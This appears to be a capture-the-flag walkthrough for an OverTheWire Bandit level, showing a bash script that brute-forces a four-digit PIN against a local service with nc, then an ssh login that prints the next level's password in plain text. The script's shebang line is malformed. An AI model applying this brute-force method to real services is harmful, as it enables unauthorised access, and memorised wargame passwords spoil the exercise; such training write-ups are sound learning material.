# Bandit Level 25
## Part I

```bash
    # We have to bruteforce the input by creating a script that try a range (0-10000) of numbers
    mkdir /tmp/reda4
    cd /tmp/reda4
    vim sdscript.sh
```
```bash
    !/bin/bash
    for i in {0000..9999}
    do
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
    done
    # [ESC] then :wq to save and quit
```
```bash
    chmod +x sdscript.sh
    ./sdscript.sh > range_numbers
    nc localhost 30002 < range_numbers
```

And copy the text to your clipboard (or try [the scp Method](https://github.com/Reda-BELHAJ/OverTheWire/blob/main/Bandit/Bandit0-9/Level1.md#part-i))
## Part II

The ***host*** to which you need to connect is *bandit.labs.overthewire.org*, on ***port*** 2220. The ***username*** is *bandit25* and the ***password*** is the text from your clipboard [Part 1](https://github.com/Reda-BELHAJ/OverTheWire/blob/main/Bandit/Bnadit21-34/Level25.md#part-i). 

1. Enter the following command:  

```bash
	ssh bandit.labs.overthewire.org -p 2220 -l bandit25
	# OR ssh bandit25@bandit.labs.overthewire.org -p 2220
	# password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```
2. Enter the password as shown in the comment of bash.
